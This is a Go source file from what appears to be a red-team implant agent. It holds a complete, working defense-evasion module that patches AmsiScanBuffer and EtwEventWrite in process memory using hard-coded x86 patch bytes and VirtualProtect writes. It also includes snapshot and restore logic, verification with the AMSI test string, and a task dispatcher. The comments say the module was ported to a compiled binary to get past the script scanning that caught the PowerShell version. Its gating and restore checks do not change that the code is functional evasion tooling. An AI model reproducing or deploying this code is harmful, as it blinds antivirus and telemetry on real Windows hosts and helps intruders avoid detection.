// evasion_windows.go — the EVASION INTERNALS TIER, ported to the native agent.
//
// WHY THIS PORT EXISTS (field-measured 2026-08-24, range day #1): the PowerShell
// tier's evasion recipes are AMSI-SIGNATURED at script parse on the range
// (VirTool:PowerShell/Ambypaz.B!MTB quarantines the script before it runs) — a
// script cannot carry its own patch recipe past a script scanner. This agent has
// NO script-parse surface: a compiled DLL/exe patches ITS OWN process without a
// byte of script being scanned. The techniques, the snapshot/verify/restore
// discipline, and the evidence shape are a faithful port of the PS tier
// (agents/evasion-host.ps1 ==EVASION-LIB==, governed by engine/evasion.mjs).
//
// SCOPE (unchanged from the PS tier — the port moves the carrier, not the boundary):
//   - amsi: the well-published in-memory AmsiScanBuffer patch (amsi.dll):
//           mov eax, 0x80070057 ; ret   (E_INVALIDARG — the scan call fails before
//           content is ever evaluated; scans THIS process submits are neutralized)
//   - etw:  the well-published in-memory EtwEventWrite noop (ntdll.dll):
//           mov eax, 0 ; ret            (ERROR_SUCCESS — this process's own ETW event
//           writes succeed-and-do-nothing)
// VERIFY + RESTORE discipline (mandatory, ported verbatim in spirit):
//   - BEFORE any write: snapshot the original bytes (their sha256 is the evidence).
//   - AFTER the write: re-read and byte-compare (the patch is PROVEN, not assumed) —
//     and for AMSI the OFFICIAL Microsoft test string is scanned before AND after
//     (blocked -> clear is a MEASURED flip, in this process, through the real AMSI
//     provider chain). For ETW the Go port ADDS the functional probe the PS tier
//     documented as out of its reach: after the byte-proof, the patched export is
//     CALLED in-process with null args and must return ERROR_SUCCESS immediately
//     (safe: the byte-proven body is `mov eax,0; ret`, which touches nothing).
//     Restore is byte-verify only — calling the REAL EtwEventWrite with fabricated
//     null args risks a null-descriptor dereference, so the byte proof stands there.
//   - restore writes the ORIGINAL bytes back and re-verifies (restore-verified);
//     AMSI is scanned once more — the flip-BACK (clear -> blocked) is measured too.
//   - status reports patched / restored / failed / not-applied honestly, with a LIVE
//     re-read for anything 'patched' (a mismatch flips the state to 'tampered').
//
// HARD BOUNDARY (permanent): OWN PROCESS ONLY. Everything below resolves and writes
// memory in THIS process (the exe, or the signed-host process that loaded the DLL).
// Nothing here touches another process, the kernel, or on-disk bytes. Process exit
// is the ultimate restore: every patch vanishes with the process, by construction.
//
// DOUBLE GATE (fail-closed, both halves): the channel refuses to queue evasion-*
// unless the engagement enabled exec.evasion (engine/evasion.mjs evasionGate), and
// THIS agent refuses unless launched with -allow-evasion (exe flag / the DLL config's
// "allowEvasion": true — the DLL form's launch flag). Default OFF everywhere.
//
// STATIC-VISIBILITY COST (measured, never hidden): resolving via GetProcAddress
// means the API and export names — "VirtualProtect", "AmsiScanBuffer",
// "EtwEventWrite", "AmsiScanString", "amsi.dll" — sit in the binary's strings/rodata
// as plain UTF-8 (Go binaries have no obfuscation; -ldflags="-s -w" strips symbols,
// NOT string literals). That is a static signature surface a scanner can match on
// the file, and it is the honest price of this port: the script tier is signatured
// at PARSE (always, on the recipe content); this tier is signatured at REST (only
// if a scanner hashes/matches the file, and only as one weak signal among many).
// The measurement (per-binary counts) is recorded in docs/NATIVE.md — not hidden.
//
// All state is in-memory. Typed errors throughout. enable/restore are IDEMPOTENT.
package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ---------------- the recipes (byte-parity with engine/evasion.mjs EVASION_RECIPES) ----------------

// evasionTechniques is the stage-1 technique set, in the canonical audit order.
var evasionTechniques = []string{"amsi", "etw"}

type evasionRecipe struct {
	dll    string
	export string
	patch  []byte
	note   string
	sha256 string // sha256 of the patch bytes — the channel-side audit pin (recipeSha256)
}

// The well-published, public in-memory neutralizations. The channel NEVER ships patch
// bytes: the recipe lives agent-side; the channel audits its sha256 at queue time
// (engine/evasion.mjs EVASION_RECIPES — keep the two copies in lockstep; the Go test
// suite pins the Node-computed hashes so a drift goes red).
var evasionRecipes = map[string]evasionRecipe{
	"amsi": {dll: "amsi.dll", export: "AmsiScanBuffer", patch: []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}, note: "mov eax,0x80070057; ret - in-memory AmsiScanBuffer neutralization (well-published public tradecraft)"},
	"etw":  {dll: "ntdll.dll", export: "EtwEventWrite", patch: []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}, note: "mov eax,0; ret - in-memory EtwEventWrite success-noop (well-published public tradecraft)"},
}

func init() {
	for k, r := range evasionRecipes {
		r.sha256 = sha256Hex(r.patch) // wire.go's helper — byte-identical to Node's digest
		evasionRecipes[k] = r
	}
}

// ---------------- typed errors (the patch machinery's failure taxonomy) ----------------

// errPatchNoSnapshot / errRestoreNoSnapshot: the cleanup doctrine rails — never write
// bytes you cannot put back; never claim a restore with no snapshot.
var errPatchNoSnapshot = errors.New("evasion patch REFUSED: no snapshot — the cleanup doctrine forbids writing bytes that cannot be restored")
var errRestoreNoSnapshot = errors.New("evasion restore REFUSED: no snapshot exists — nothing was ever patched here")

// spanError is the RangeError-class refusal: patch writes cover EXACTLY the
// snapshotted span — a short write leaves a franken-function, a long one clobbers
// the next instruction.
type spanError struct{ want, got int }

func (e *spanError) Error() string {
	return fmt.Sprintf("evasion patch REFUSED: patch is %d bytes but the snapshotted region is %d — exact-span writes only", e.got, e.want)
}

// verifyError is the write-did-not-take failure: the re-read after a write did not
// match. For "patch" nothing is claimed; for "restore" the region is NOT restored —
// a loud failure, never a quiet lie (a lie about restoration is worse).
type verifyError struct{ op string } // "patch" | "restore"

func (e *verifyError) Error() string {
	if e.op == "restore" {
		return "evasion restore FAILED: the re-read does not match the original bytes — the region is NOT restored (loud failure, not a quiet lie)"
	}
	return "evasion patch FAILED: the re-read does not match the patch bytes — the write did not take (nothing claimed)"
}

// unknownTechniqueError guards the op layer below the spec parse (defense in depth —
// parseEvasionSpec is the gate that normally refuses these first).
type unknownTechniqueError struct{ tech string }

func (e *unknownTechniqueError) Error() string {
	return "unknown evasion technique: " + e.tech + " (stage 1 ships amsi, etw only — own-process, in-memory, nothing else)"
}

// ---------------- patchRegion — the pure byte-math twin of engine/evasion.mjs PatchRegion ----------------

// patchRegion holds a LIVE view over one target span plus the protection-aware write
// path. The discipline is the engine's PatchRegion contract, byte for byte:
// snapshot BEFORE (never write what you cannot restore), patch == exact span ==
// verified re-read, restore == the snapshot bytes back == verified re-read. Tests
// drive it over a fake span (a plain []byte); the live leg drives it over the
// export's real entry bytes (an unsafe view; writes go through VirtualProtect).
type patchRegion struct {
	view  []byte             // exactly the patch span; writes land in the target
	write func(b []byte) error // fake spans: a plain copy; real spans: VirtualProtect dance
	snap  []byte             // nil until snapshot() — the ONLY restore source
}

func newPatchRegion(view []byte, write func([]byte) error) (*patchRegion, error) {
	if len(view) == 0 {
		return nil, errors.New("patchRegion needs the region bytes (a live view over the target span)")
	}
	if write == nil {
		write = func(b []byte) error { copy(view, b); return nil }
	}
	return &patchRegion{view: view, write: write}, nil
}

// snapshot records the region exactly as it lies NOW. Returns the snapshot's sha256.
func (r *patchRegion) snapshot() string {
	r.snap = append([]byte(nil), r.view...)
	return sha256Hex(r.snap)
}

// patch writes p over the region and PROVES the write (re-read compare). Exact-span
// writes only. Returns the patch's sha256.
func (r *patchRegion) patch(p []byte) (string, error) {
	if r.snap == nil {
		return "", errPatchNoSnapshot
	}
	if len(p) != len(r.snap) {
		return "", &spanError{want: len(r.snap), got: len(p)}
	}
	if err := r.write(p); err != nil {
		return "", err
	}
	if !r.verify(p) {
		return "", &verifyError{op: "patch"}
	}
	return sha256Hex(p), nil
}

// verify re-reads the live region and byte-compares against expected. Pure observation.
func (r *patchRegion) verify(expected []byte) bool { return bytes.Equal(r.view, expected) }

// restore writes the SNAPSHOT back and PROVES the restore (re-read == original).
// A failed restore is a loud *verifyError, not a quiet lie. Returns the restored
// region's sha256 (== the snapshot's).
func (r *patchRegion) restore() (string, error) {
	if r.snap == nil {
		return "", errRestoreNoSnapshot
	}
	if err := r.write(r.snap); err != nil {
		return "", err
	}
	if !r.verify(r.snap) {
		return "", &verifyError{op: "restore"}
	}
	return sha256Hex(r.snap), nil
}

// ---------------- the evidence shape (parse-compatible with engine/evasion.mjs parseEvasionEvidence) ----------------

// techniqueEvidence mirrors the PS host's per-technique evidence object field for
// field (key ORDER included — Go marshals struct fields in declaration order):
// the channel's 120-char ledger preview and the intake parser read exactly this.
type techniqueEvidence struct {
	State           string         `json:"state"`           // patched | restored | failed | not-applied | tampered
	Recipe          string         `json:"recipe"`          // "amsi.dll!AmsiScanBuffer"
	RecipeNote      string         `json:"recipeNote"`      // the public-tradecraft one-liner
	RecipeSha256    string         `json:"recipeSha256"`    // the queue-time audit pin
	OriginalSha256  *string        `json:"originalSha256"`  // null until snapshotted
	PatchedSha256   *string        `json:"patchedSha256"`   // null until a verified write
	RestoredSha256  *string        `json:"restoredSha256"`  // null until a verified restore (== original)
	ByteVerified    bool           `json:"byteVerified"`    // patch re-read proof
	RestoreVerified bool           `json:"restoreVerified"` // restore re-read proof
	Verify          map[string]any `json:"verify"`          // the measured probe (amsi flip / etw functional)
	Note            *string        `json:"note"`            // honest caveats (unproven flips, idempotent no-ops)
	Error           *string        `json:"error"`           // loud failure text
}

// evasionResult is the op-first result body: {"op","pid","state","techniques",...}.
// op LEADS so the channel's ledger preview always carries it (PS host parity).
type evasionResult struct {
	Op         string                        `json:"op"`
	PID        int                           `json:"pid"`
	State      string                        `json:"state"`
	Techniques map[string]*techniqueEvidence `json:"techniques"`
	At         string                        `json:"at"`
	Error      string                        `json:"error,omitempty"` // op-level failures only (empty techniques — no fabricated evidence)
}

func strptr(s string) *string { return &s }

func newEvidence(tech string) *techniqueEvidence {
	r := evasionRecipes[tech]
	return &techniqueEvidence{
		State: "failed", Recipe: r.dll + "!" + r.export, RecipeNote: r.note, RecipeSha256: r.sha256,
	}
}

// ---------------- the live process-memory leg (the ONLY part unit tests fake) ----------------

// evasionEnv is the seam between the op machinery and this process's real memory.
// The live leg resolves real export entry points; the unit tests inject a fake (a
// []byte stands in for the span). Everything ABOVE the seam — snapshot/patch/verify/
// restore, the evidence assembly, idempotency — is identical in both, by design.
type evasionEnv struct {
	resolve  func(tech string) (*patchRegion, uintptr, error) // the target span + its address
	amsiScan func() string                                    // 'blocked' | 'clear' | 'unavailable:<hr>'
	etwCall  func(addr uintptr) uint32                        // call the (patched) export in-process; returns its eax
}

// liveResolve maps the technique's export in THIS process and hands back a
// protection-aware patchRegion over its entry bytes. GetModuleHandle/GetProcAddress
// equivalents via x/sys/windows: NewLazySystemDLL does LoadLibraryExW with
// LOAD_LIBRARY_SEARCH_SYSTEM32 (the already-mapped ntdll returns its in-process
// handle; amsi.dll loads on demand — the PS tier's GetModuleHandle→LoadLibrary
// dance in one safe call) and LazyProc.Find is the GetProcAddress.
func liveResolve(tech string) (*patchRegion, uintptr, error) {
	r, ok := evasionRecipes[tech]
	if !ok {
		return nil, 0, &unknownTechniqueError{tech: tech}
	}
	proc := windows.NewLazySystemDLL(r.dll).NewProc(r.export)
	if err := proc.Find(); err != nil {
		return nil, 0, fmt.Errorf("cannot resolve %s!%s in this process: %w", r.dll, r.export, err)
	}
	addr := proc.Addr()
	n := len(r.patch)
	// unsafe.Pointer(addr) — the ONE conversion `go vet -unsafeptr` cannot prove safe.
	// It IS safe here by construction: addr is an export entry in an OS-loader-mapped
	// module (amsi.dll/ntdll.dll), pinned for the life of the process by the Windows
	// loader — the Go GC neither moves nor reclaims it, and the span never outlives
	// the process. A foreign-address Go slice has no vet-provable form; the
	// alternative (Read/WriteProcessMemory on our own pseudo-handle) is the same
	// memory write wearing a cross-process costume. Documented, not hidden.
	view := unsafe.Slice((*byte)(unsafe.Pointer(addr)), n)
	write := func(b []byte) error {
		var old uint32
		if err := windows.VirtualProtect(addr, uintptr(n), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
			return fmt.Errorf("VirtualProtect(PAGE_EXECUTE_READWRITE) on %s!%s refused: %w", r.dll, r.export, err)
		}
		copy(view, b)
		var tmp uint32
		// Restore the page's original protection. A failure here does not un-write the
		// bytes (they already landed and are about to be re-read-verified) — PS tier
		// parity ([void]); the write proof is the re-read, not the protection restore.
		_ = windows.VirtualProtect(addr, uintptr(n), old, &tmp)
		return nil
	}
	region, err := newPatchRegion(view, write)
	if err != nil {
		return nil, 0, err
	}
	return region, addr, nil
}

// The AMSI exports the verification scan drives (the REAL provider chain, in-process).
// Lazy resolution: the names land in the binary's strings table — measured, documented
// in the file header, never hidden.
var (
	amsiDLL              = windows.NewLazySystemDLL("amsi.dll")
	procAmsiInitialize   = amsiDLL.NewProc("AmsiInitialize")
	procAmsiOpenSession  = amsiDLL.NewProc("AmsiOpenSession")
	procAmsiScanString   = amsiDLL.NewProc("AmsiScanString")
	procAmsiCloseSession = amsiDLL.NewProc("AmsiCloseSession")
	procAmsiUninitialize = amsiDLL.NewProc("AmsiUninitialize")
)

// liveAmsiScan scans the OFFICIAL Microsoft AMSI test string (AMSI Test Sample:
// 7e72c3ce-861b-4339-8740-0ac1484c1386) in THIS process through the real provider
// chain — the PS tier's Invoke-VvAmsiTestScan, ported. Returns 'blocked' (the
// provider flagged it: result >= 0x4001 — DETECTED or BLOCKED-BY-ADMIN), 'clear'
// (clean, not-detected, OR the scan call itself failed — post-patch the patched
// AmsiScanBuffer returns E_INVALIDARG and the content is never evaluated), or
// 'unavailable:<hr>' when AMSI cannot even initialize here (the honest third state —
// a flip cannot be proven against an unavailable scanner).
func liveAmsiScan() (out string) {
	// A LazyProc.Call on an absent DLL/export panics (mustFind) — the PS tier's
	// try/catch maps to a recover: unavailable, never a crash of the agent loop.
	defer func() {
		if r := recover(); r != nil {
			out = "unavailable:" + fmt.Sprint(r)
		}
	}()
	appName := windows.StringToUTF16Ptr("VARVEL-evasion-verify")
	var ctx, sess uintptr
	r1, _, _ := procAmsiInitialize.Call(uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(&ctx)))
	if r1 != 0 || ctx == 0 {
		return fmt.Sprintf("unavailable:0x%08x", uint32(r1))
	}
	defer procAmsiUninitialize.Call(ctx)
	r1, _, _ = procAmsiOpenSession.Call(ctx, uintptr(unsafe.Pointer(&sess)))
	if r1 != 0 {
		return fmt.Sprintf("unavailable:0x%08x", uint32(r1))
	}
	defer procAmsiCloseSession.Call(ctx, sess)
	content := windows.StringToUTF16Ptr("AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386")
	contentName := windows.StringToUTF16Ptr("varvel-evasion-verify")
	var result int32
	r1, _, _ = procAmsiScanString.Call(
		ctx,
		uintptr(unsafe.Pointer(content)),
		uintptr(unsafe.Pointer(contentName)),
		sess,
		uintptr(unsafe.Pointer(&result)),
	)
	if r1 != 0 {
		return "clear" // the scan itself failed — content never evaluated (the patched state)
	}
	if uint32(result) >= 0x4001 {
		return "blocked"
	}
	return "clear"
}

// liveEtwCall invokes the (byte-proven patched) EtwEventWrite in-process with null
// arguments and returns its eax. Post-patch the body is `mov eax,0; ret` — it
// dereferences nothing, so the null-arg call is safe by byte-proof. Returns the
// raw return value; the caller asserts ERROR_SUCCESS (0).
func liveEtwCall(addr uintptr) uint32 {
	r1, _, _ := syscall.SyscallN(addr, 0, 0, 0, 0)
	return uint32(r1)
}

func liveEvasionEnv() *evasionEnv {
	return &evasionEnv{resolve: liveResolve, amsiScan: liveAmsiScan, etwCall: liveEtwCall}
}

// ---------------- the op machinery (enable / restore / status) ----------------

// livePatch is one technique's live state: the region (whose snapshot is the ONLY
// restore source), the patch bytes, and the honest state word.
type livePatch struct {
	addr   uintptr
	region *patchRegion
	patch  []byte
	state  string // "patched" | "restored"
}

// evasionEngine owns the per-process patch state and the env seam. The agent uses
// ONE process-global engine (patch state is process state); tests build their own
// over a fake env. All state in memory; nothing touches disk.
type evasionEngine struct {
	mu   sync.Mutex // the agent's task loop is serial; the mutex is honesty under any embedding
	env  *evasionEnv
	live map[string]*livePatch
}

var defaultEvasionEngine = &evasionEngine{env: liveEvasionEnv(), live: map[string]*livePatch{}}

// enableTech patches one technique, or reports the idempotent re-enable / a loud
// failure. Never panics; every failure path is typed text in the evidence.
func (e *evasionEngine) enableTech(tech string) *techniqueEvidence {
	if _, ok := evasionRecipes[tech]; !ok {
		return &techniqueEvidence{State: "failed", Error: strptr((&unknownTechniqueError{tech: tech}).Error())}
	}
	ev := newEvidence(tech)
	r := evasionRecipes[tech]
	// IDEMPOTENT RE-ENABLE (a wrinkle the PS tier has silently, made explicit here):
	// already patched by THIS process → re-verify the live bytes and KEEP the original
	// snapshot as the only restore source. Re-snapshotting now would record the PATCH
	// bytes as "original" and restore would put the patch back — a restore-to-patched
	// lie by construction. This port refuses that construction.
	if lp := e.live[tech]; lp != nil && lp.state == "patched" {
		ev.OriginalSha256 = strptr(sha256Hex(lp.region.snap))
		ev.PatchedSha256 = strptr(sha256Hex(lp.patch))
		if lp.region.verify(lp.patch) {
			ev.State = "patched"
			ev.ByteVerified = true
			ev.Note = strptr("already patched — idempotent re-enable: the pre-patch snapshot remains the only restore source (re-snapshotting the patch bytes would corrupt restore)")
		} else {
			ev.Error = strptr("live re-read != patch bytes — the region changed under this patch (tampered); the original snapshot is intact: run evasion-restore before re-patching")
		}
		return ev
	}
	// MEASURED BEFORE-STATE (amsi): scan the official test string pre-patch.
	var scanBefore string
	if tech == "amsi" {
		scanBefore = e.env.amsiScan()
	}
	region, addr, err := e.env.resolve(tech)
	if err != nil {
		ev.Error = strptr(err.Error())
		return ev
	}
	// SNAPSHOT FIRST — the cleanup doctrine: never write bytes you cannot put back.
	origSha := region.snapshot()
	ev.OriginalSha256 = strptr(origSha)
	patchedSha, err := region.patch(r.patch) // exact-span write + re-read PROOF (typed errors)
	if err != nil {
		ev.Error = strptr(err.Error())
		return ev
	}
	ev.ByteVerified = true // patch() only returns success on a proven re-read
	ev.PatchedSha256 = strptr(patchedSha)
	if tech == "amsi" {
		scanAfter := e.env.amsiScan()
		flip := scanBefore == "blocked" && scanAfter == "clear"
		ev.Verify = map[string]any{
			"probe":      "official-amsi-test-string (in-process AmsiScanString)",
			"before":     scanBefore,
			"after":      scanAfter,
			"flipProven": flip,
		}
		if !flip {
			ev.Note = strptr("bytes patched + verified, but the blocked->clear flip was NOT measured (before=" + scanBefore + ", after=" + scanAfter + ") — patch state is byte-proven only; the scanner may be off/absent on this host")
		}
	} else {
		// ETW FUNCTIONAL PROBE (the Go port's addition): the byte-proven patch body is
		// `mov eax,0; ret` — calling it with null args touches nothing and MUST return
		// ERROR_SUCCESS immediately. before/after stay null (there is no honest
		// pre-patch null-arg call — the REAL EtwEventWrite would dereference the null
		// descriptor), so flipProven stays false exactly like the PS tier.
		rc := e.env.etwCall(addr)
		functional := fmt.Sprintf("patched EtwEventWrite(0,0,0,0) returned 0x%x immediately in this process — the noop is live; end-to-end event suppression (what gets recorded) is the detoracle measurement on the next probe, not a claim made here", rc)
		var note *string
		if rc != 0 {
			note = strptr(fmt.Sprintf("bytes patched + verified, but the in-process noop call returned 0x%x (want 0 = ERROR_SUCCESS) — patch state is byte-proven only", rc))
		}
		ev.Verify = map[string]any{
			"probe":      "byte-reverify + in-process noop call (null args; safe by byte-proof)",
			"before":     nil,
			"after":      nil,
			"flipProven": false,
			"functional": functional,
		}
		ev.Note = note
	}
	e.live[tech] = &livePatch{addr: addr, region: region, patch: append([]byte(nil), r.patch...), state: "patched"}
	ev.State = "patched"
	return ev
}

// restoreTech writes the snapshot back over one live patch and PROVES the restore.
// A no-op when nothing is patched (honest note, PS parity); a loud 'failed' when the
// restore write does not verify (never a quiet lie about restoration).
func (e *evasionEngine) restoreTech(tech string) *techniqueEvidence {
	if _, ok := evasionRecipes[tech]; !ok {
		return &techniqueEvidence{State: "failed", Error: strptr((&unknownTechniqueError{tech: tech}).Error())}
	}
	ev := newEvidence(tech)
	ev.State = "restored"
	st := e.live[tech]
	if st == nil || st.state != "patched" {
		ev.Note = strptr("no live patch in THIS process — nothing to restore (in-memory patches never survive process exit; this process was already clean)")
		return ev
	}
	ev.OriginalSha256 = strptr(sha256Hex(st.region.snap))
	ev.PatchedSha256 = strptr(sha256Hex(st.patch))
	restoredSha, err := st.region.restore()
	if err != nil {
		ev.State = "failed"
		ev.Error = strptr(err.Error())
		return ev
	}
	ev.RestoreVerified = true
	ev.RestoredSha256 = strptr(restoredSha)
	if tech == "amsi" {
		// MEASURED flip-BACK: the official test string must be blocked again.
		scanAfter := e.env.amsiScan()
		ev.Verify = map[string]any{
			"probe":          "official-amsi-test-string (in-process AmsiScanString)",
			"before":         "clear",
			"after":          scanAfter,
			"flipBackProven": scanAfter == "blocked",
		}
		if scanAfter != "blocked" {
			ev.Note = strptr("original bytes restored + verified, but the clear->blocked flip-back was NOT measured (after=" + scanAfter + ") — the scanner may be off/absent on this host")
		}
	} else {
		ev.Verify = map[string]any{
			"probe":          "byte-reverify only",
			"before":         nil,
			"after":          nil,
			"flipBackProven": false,
			"functional":     "not-probed (calling the REAL EtwEventWrite with fabricated null args risks a null-descriptor dereference — the byte-verified restore stands)",
		}
	}
	st.state = "restored"
	return ev
}

// statusTech reports the honest state with a LIVE re-read for anything 'patched'
// (measured now, not remembered — a mismatch flips the state to 'tampered').
func (e *evasionEngine) statusTech(tech string) *techniqueEvidence {
	if _, ok := evasionRecipes[tech]; !ok {
		return &techniqueEvidence{State: "failed", Error: strptr((&unknownTechniqueError{tech: tech}).Error())}
	}
	ev := newEvidence(tech)
	st := e.live[tech]
	if st == nil {
		ev.State = "not-applied"
		ev.Note = strptr("never patched in this process")
		return ev
	}
	ev.State = st.state
	ev.OriginalSha256 = strptr(sha256Hex(st.region.snap))
	ev.PatchedSha256 = strptr(sha256Hex(st.patch))
	switch st.state {
	case "restored":
		ev.RestoredSha256 = ev.OriginalSha256
		ev.RestoreVerified = true
	case "patched":
		ev.ByteVerified = st.region.verify(st.patch)
		if !ev.ByteVerified {
			ev.State = "tampered"
			ev.Note = strptr("live re-read != patch bytes — the region changed since the write (someone restored or re-patched it); reporting honestly")
		}
	}
	return ev
}

// runOp dispatches one op into the op-first evidence JSON string — the shape
// engine/evasion.mjs parseEvasionEvidence parses channel-side, UNCHANGED.
func (e *evasionEngine) runOp(op string, techniques []string) string {
	e.mu.Lock()
	defer e.mu.Unlock()
	techs := map[string]*techniqueEvidence{}
	opErr := ""
	switch op {
	case "enable":
		if len(techniques) == 0 {
			opErr = "evasion-enable: techniques is empty — nothing to do"
			break
		}
		for _, t := range techniques {
			techs[t] = e.enableTech(t)
		}
	case "restore":
		targets := techniques
		if len(targets) == 0 { // restore whatever THIS process has patched
			for _, t := range evasionTechniques {
				if st := e.live[t]; st != nil && st.state == "patched" {
					targets = append(targets, t)
				}
			}
			if len(targets) == 0 { // nothing live: report the honest no-op per technique
				targets = append(targets, evasionTechniques...)
			}
		}
		for _, t := range targets {
			techs[t] = e.restoreTech(t)
		}
	case "status":
		for _, t := range evasionTechniques {
			techs[t] = e.statusTech(t)
		}
	default:
		opErr = "unknown evasion op: " + op + " (want enable | restore | status)"
	}
	// Aggregate state (PS parity): 'failed' if ANY failed — a partial patch is never
	// dressed up as a win; else the op's success state; status aggregates
	// untouched / patched / restored / mixed from the per-technique truth.
	res := evasionResult{
		Op: op, PID: os.Getpid(), Techniques: techs,
		At: time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
	}
	if opErr != "" {
		res.State = "failed"
		res.Error = opErr
	} else {
		states := make([]string, 0, len(techs))
		for _, t := range evasionTechniques { // canonical order for the aggregation scan
			if ev, ok := techs[t]; ok {
				states = append(states, ev.State)
			}
		}
		anyFailed := false
		for _, s := range states {
			if s == "failed" {
				anyFailed = true
			}
		}
		switch {
		case anyFailed:
			res.State = "failed"
		case op == "enable":
			res.State = "patched"
		case op == "restore":
			res.State = "restored"
		default:
			nonApplied, anyPatched, allRestored := 0, false, len(states) > 0
			for _, s := range states {
				if s != "not-applied" {
					nonApplied++
				}
				if s == "patched" {
					anyPatched = true
				}
				if s != "restored" {
					allRestored = false
				}
			}
			switch {
			case nonApplied == 0:
				res.State = "untouched"
			case anyPatched:
				res.State = "patched"
			case allRestored:
				res.State = "restored"
			default:
				res.State = "mixed"
			}
		}
	}
	b, err := json.Marshal(res)
	if err != nil { // a marshal failure is an op-level failure, never a crash
		b, _ = json.Marshal(evasionResult{Op: op, PID: os.Getpid(), State: "failed", Techniques: map[string]*techniqueEvidence{}, At: res.At, Error: err.Error()})
	}
	return string(b)
}

// ---------------- the task surface (the spec-gate port + the op dispatch) ----------------

// evasionSpec is the parsed task data: the kind and the deduped technique subset.
// techniques == nil means "restore whatever is patched" (evasion-restore with empty
// data) — the agent is the only one who knows its live patch state.
type evasionSpec struct {
	kind       string
	techniques []string
}

// parseEvasionSpec is the Go port of engine/evasion.mjs parseEvasionSpec — the same
// refusal layer the channel runs pre-queue, run again pre-execution (defense in
// depth; the channel is the authoritative gate). Loud, typed-text refusals.
func parseEvasionSpec(kind, data string) (evasionSpec, error) {
	switch kind {
	case "evasion-enable", "evasion-restore", "evasion-status":
	default:
		return evasionSpec{}, fmt.Errorf("evasion: unknown kind %q (want one of evasion-enable, evasion-restore, evasion-status)", kind)
	}
	raw := strings.TrimSpace(data)
	if kind == "evasion-status" {
		if raw != "" && raw != "{}" {
			return evasionSpec{}, fmt.Errorf("evasion-status takes no task data (got %.40s)", raw)
		}
		return evasionSpec{kind: kind}, nil
	}
	if kind == "evasion-restore" && (raw == "" || raw == "{}") {
		return evasionSpec{kind: kind}, nil // restore-all-patched
	}
	var doc any
	if err := json.Unmarshal([]byte(raw), &doc); err != nil {
		return evasionSpec{}, fmt.Errorf("%s: task data is not valid JSON (want {\"techniques\":[\"amsi\",\"etw\"]})", kind)
	}
	obj, ok := doc.(map[string]any)
	if !ok {
		return evasionSpec{}, fmt.Errorf("%s: task data must be a JSON object", kind)
	}
	rawList, ok := obj["techniques"].([]any)
	if !ok {
		return evasionSpec{}, fmt.Errorf("%s: techniques must be an array (subset of %s)", kind, strings.Join(evasionTechniques, ", "))
	}
	seen := map[string]bool{}
	techs := make([]string, 0, len(rawList))
	for _, item := range rawList {
		s := strings.ToLower(strings.TrimSpace(fmt.Sprint(item)))
		if !seen[s] {
			seen[s] = true
			techs = append(techs, s)
		}
	}
	if len(techs) == 0 {
		return evasionSpec{}, fmt.Errorf("%s: techniques is empty — nothing to do", kind)
	}
	if len(techs) > len(evasionTechniques) {
		return evasionSpec{}, fmt.Errorf("%s: %d techniques is over the %d cap", kind, len(techs), len(evasionTechniques))
	}
	for _, t := range techs {
		if _, ok := evasionRecipes[t]; !ok {
			return evasionSpec{}, fmt.Errorf("%s: unknown technique %q (stage 1 ships %s only — own-process, in-memory, nothing else)", kind, t, strings.Join(evasionTechniques, ", "))
		}
	}
	return evasionSpec{kind: kind, techniques: techs}, nil
}

// evasionArmState renders the evasion gate's launch state honestly (the PS agent's
// startup line parity: ARMED only when the flag flew; the engagement gate is the
// other half, decided channel-side per task). Shared by the exe's launch line and
// the DLL form's run note.
func evasionArmState(armed bool) string {
	if armed {
		return "ARMED (-allow-evasion; the engagement exec.evasion gate must also be on)"
	}
	return "OFF (default — no -allow-evasion)"
}

// execEvasion handles one evasion-* task: the agent-side half of the double gate,
// then the spec parse, then the op. Every path returns a body — a refusal is loud
// plain text (NO evidence JSON: the channel fabricates no audit event from a
// refusal), an attempt is the op-first evidence JSON.
func (a *Agent) execEvasion(kind, data string) []byte {
	if !a.AllowEvasion {
		return []byte(kind + " REFUSED: agent-side evasion is OFF (this agent was launched without -allow-evasion; the engagement exec.evasion gate must also be on) — nothing patched, nothing restored")
	}
	spec, err := parseEvasionSpec(kind, data)
	if err != nil {
		return []byte(kind + " REJECTED: " + err.Error())
	}
	return []byte(defaultEvasionEngine.runOp(strings.TrimPrefix(kind, "evasion-"), spec.techniques))
}
